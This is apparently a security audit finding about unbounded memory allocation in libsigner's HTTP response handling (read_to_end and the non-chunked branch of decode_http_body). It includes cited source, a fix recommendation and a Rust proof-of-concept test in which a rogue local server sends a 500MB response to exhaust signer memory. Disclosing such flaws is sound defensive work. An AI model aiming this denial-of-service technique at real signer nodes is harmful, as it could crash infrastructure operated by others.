### Title
Unbounded memory allocation in `decode_http_body`/`run_http_request` non-chunked response path lets a malicious StackerDB replica exhaust signer memory - (File: libsigner/src/http.rs)

### Summary
`decode_http_body` enforces `MAX_MESSAGE_LEN` only for the `transfer-encoding: chunked` branch via `HttpChunkedTransferReader::from_reader(ptr, MAX_MESSAGE_LEN.into())`, while the non-chunked branch does `buf.to_vec()` with no size cap at all. Worse, the raw response buffer itself is already read without any bound in `run_http_request` before either branch runs, so any StackerDB host the signer's `StackerDBSession::rpc_request` connects to can force an unbounded heap allocation with a single oversized HTTP response.

### Finding Description
`decode_http_body` in `libsigner/src/http.rs` [1](#0-0)  applies `MAX_MESSAGE_LEN` only to chunked bodies (line 207) and simply does `buf.to_vec()` for non-chunked bodies (line 213), with no `Content-Length` or absolute-size check. This confirms the claimed inequality: chunked responses are size-bounded during decode, non-chunked responses are not bounded at all in this function.

However, tracing the call site shows the fault is actually broader than just this function: `run_http_request` reads the entire raw response with `sock.read_to_end(&mut buf)` [2](#0-1)  before `decode_http_response`/`decode_http_body` are even invoked. This `read_to_end` has no size limit and will happily buffer an arbitrarily large stream sent by the remote peer until the connection closes or the socket read timeout fires — it applies identically whether the response ultimately claims to be chunked or not, and it precedes and is independent of the `MAX_MESSAGE_LEN` check inside the chunked decoder. So even the "bounded" chunked path is preceded by an unbounded raw-byte buffering step; `MAX_MESSAGE_LEN` there only bounds the *decoded* output size, not the attacker's ability to force the signer to buffer a huge raw response first.

The reachable attacker path: the signer's `StackerDBSession::rpc_request` [3](#0-2)  is used by `list_chunks`, `get_chunks`, `get_latest_chunks`, and `put_chunk` [4](#0-3)  to talk to a configured StackerDB host. If that host (a node/relay the signer is configured to use, potentially attacker-influenced or itself malicious) returns a huge non-chunked, `Content-Length`-matching (or even mismatched, since there's no enforcement) body, the signer will allocate memory proportional to the entire attacker-supplied response with no upper bound, whether via the unbounded `read_to_end` or via the unguarded `buf.to_vec()` in the non-chunked branch of `decode_http_body`.

### Impact Explanation
A single malicious/compromised HTTP response can force the signer process to allocate memory proportional to the attacker-chosen response size (limited only by available memory/socket timeout), causing process-level memory exhaustion / crash (OOM) on the signer. This matches the Critical category "remote crash/unauthenticated DoS from few messages" — here a single response. It is repeatable on every `rpc_request` call (e.g., every `list_chunks`/`get_chunks` poll cycle), and no privileged role or secret is required — only being (or influencing) the StackerDB host the signer session is configured to talk to.

### Likelihood Explanation
Preconditions: the signer must be configured to fetch StackerDB chunks/metadata from a host under attacker control or influence (e.g., a malicious or compromised node/relay acting as the StackerDB endpoint). No secret, key, or admin privilege is needed — the attacker only needs to be the TCP peer answering the signer's outbound HTTP request. Cost is trivial: send one oversized response. `get_latest_chunks` post-validates size against `STACKERDB_MAX_CHUNK_SIZE`/`SIGNERS_STACKERDB_CHUNK_SIZE` [5](#0-4)  but only *after* the unbounded allocation/copy has already occurred, so it does not prevent the exhaustion.

### Recommendation
Enforce a hard cap (e.g., `MAX_MESSAGE_LEN`) on the total bytes read in `run_http_request`'s `sock.read_to_end` (e.g., read incrementally and abort once the accumulated size exceeds the cap, or use a length-limited reader), and additionally validate/cap `Content-Length` and enforce the same limit on the non-chunked branch of `decode_http_body` before calling `buf.to_vec()` (e.g., reject or truncate bodies larger than `MAX_MESSAGE_LEN`).

### Proof of Concept
```rust
// libsigner/src/tests/http.rs (net-style test)
use std::io::Write;
use std::net::TcpListener;
use std::thread;
use std::time::Duration;
use libsigner::session::StackerDBSession; // or direct run_http_request call
use clarity::vm::types::QualifiedContractIdentifier;

#[test]
fn oversized_non_chunked_body_causes_unbounded_alloc() {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();

    thread::spawn(move || {
        if let Ok((mut stream, _)) = listener.accept() {
            let body_len = 500 * 1024 * 1024; // 500MB, far exceeding MAX_MESSAGE_LEN
            let header = format!(
                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n", body_len
            );
            stream.write_all(header.as_bytes()).unwrap();
            let chunk = vec![b'A'; 1024 * 1024];
            for _ in 0..(body_len / chunk.len()) {
                stream.write_all(&chunk).unwrap();
            }
        }
    });

    let contract_id = QualifiedContractIdentifier::transient();
    let mut session = StackerDBSession::new(
        &addr.to_string(), contract_id, Duration::from_secs(30)
    );
    session.connect_or_reconnect().unwrap();
    // observe unbounded allocation via `decode_http_body`'s `buf.to_vec()`
    // and the preceding unbounded `sock.read_to_end` in run_http_request
    let _ = session.rpc_request("GET", "/", None, &[]);
    // assertion: process memory grows by ~500MB for a single response,
    // with no error/rejection despite exceeding MAX_MESSAGE_LEN
}
```
Instrumenting/observing RSS growth (or running under a memory limit to trigger OOM) demonstrates that neither `run_http_request`'s socket read nor `decode_http_body`'s non-chunked branch enforce `MAX_MESSAGE_LEN`.

### Citations

**File:** libsigner/src/http.rs (L197-217)
```rust
pub fn decode_http_body(headers: &HashMap<String, String>, mut buf: &[u8]) -> io::Result<Vec<u8>> {
    let chunked = if let Some(val) = headers.get("transfer-encoding") {
        val == "chunked"
    } else {
        false
    };

    let body = if chunked {
        // chunked encoding
        let ptr = &mut buf;
        let mut fd = HttpChunkedTransferReader::from_reader(ptr, MAX_MESSAGE_LEN.into());
        let mut decoded_body = vec![];
        fd.read_to_end(&mut decoded_body)?;
        decoded_body
    } else {
        // body is just as-is
        buf.to_vec()
    };

    Ok(body)
}
```

**File:** libsigner/src/http.rs (L249-253)
```rust
    let mut buf = vec![];

    sock.read_to_end(&mut buf)?;

    let (headers, body_offset) = decode_http_response(&buf)?;
```

**File:** libsigner/src/session.rs (L162-172)
```rust
    fn rpc_request(
        &mut self,
        verb: &str,
        path: &str,
        content_type: Option<&str>,
        payload: &[u8],
    ) -> Result<Vec<u8>, RPCError> {
        self.with_socket(|session, sock| {
            run_http_request(sock, &session.host, verb, path, content_type, payload)
        })?
    }
```

**File:** libsigner/src/session.rs (L188-273)
```rust
    fn list_chunks(&mut self) -> Result<Vec<SlotMetadata>, RPCError> {
        let bytes = self.rpc_request(
            "GET",
            &stackerdb_get_metadata_path(self.stackerdb_contract_id.clone()),
            None,
            &[],
        )?;
        let metadata: Vec<SlotMetadata> = serde_json::from_slice(&bytes)
            .map_err(|e| RPCError::Deserialize(format!("{:?}", e)))?;
        Ok(metadata)
    }

    /// query the replica for zero or more chunks
    fn get_chunks(
        &mut self,
        slots_and_versions: &[(u32, u32)],
    ) -> Result<Vec<Option<Vec<u8>>>, RPCError> {
        let mut payloads = vec![];
        for (slot_id, slot_version) in slots_and_versions.iter() {
            let path = stackerdb_get_chunk_path(
                self.stackerdb_contract_id.clone(),
                *slot_id,
                Some(*slot_version),
            );
            let chunk = match self.rpc_request("GET", &path, None, &[]) {
                Ok(body_bytes) => Some(body_bytes),
                Err(RPCError::HttpError(code)) => {
                    if code != 404 {
                        return Err(RPCError::HttpError(code));
                    }
                    None
                }
                Err(e) => {
                    return Err(e);
                }
            };
            payloads.push(chunk);
        }
        Ok(payloads)
    }

    /// query the replica for zero or more latest chunks
    fn get_latest_chunks(&mut self, slot_ids: &[u32]) -> Result<Vec<Option<Vec<u8>>>, RPCError> {
        let mut payloads = vec![];
        let limit = if self.stackerdb_contract_id.name.starts_with("signer") {
            SIGNERS_STACKERDB_CHUNK_SIZE
        } else {
            usize::try_from(STACKERDB_MAX_CHUNK_SIZE)
                .expect("infallible: StackerDB chunk size exceeds usize::MAX")
        };
        for slot_id in slot_ids.iter() {
            let path = stackerdb_get_chunk_path(self.stackerdb_contract_id.clone(), *slot_id, None);
            let chunk = match self.rpc_request("GET", &path, None, &[]) {
                Ok(body_bytes) => {
                    // Verify that the chunk is not too large
                    if body_bytes.len() > limit {
                        None
                    } else {
                        Some(body_bytes)
                    }
                }
                Err(RPCError::HttpError(code)) => {
                    if code != 404 {
                        return Err(RPCError::HttpError(code));
                    }
                    None
                }
                Err(e) => {
                    return Err(e);
                }
            };
            payloads.push(chunk);
        }
        Ok(payloads)
    }

    /// upload a chunk
    fn put_chunk(&mut self, chunk: &StackerDBChunkData) -> Result<StackerDBChunkAckData, RPCError> {
        let body =
            serde_json::to_vec(chunk).map_err(|e| RPCError::Deserialize(format!("{e:?}")))?;
        let path = stackerdb_post_chunk_path(self.stackerdb_contract_id.clone());
        let resp_bytes = self.rpc_request("POST", &path, Some("application/json"), &body)?;
        let ack: StackerDBChunkAckData = serde_json::from_slice(&resp_bytes)
            .map_err(|e| RPCError::Deserialize(format!("{e:?}")))?;
        Ok(ack)
    }
```
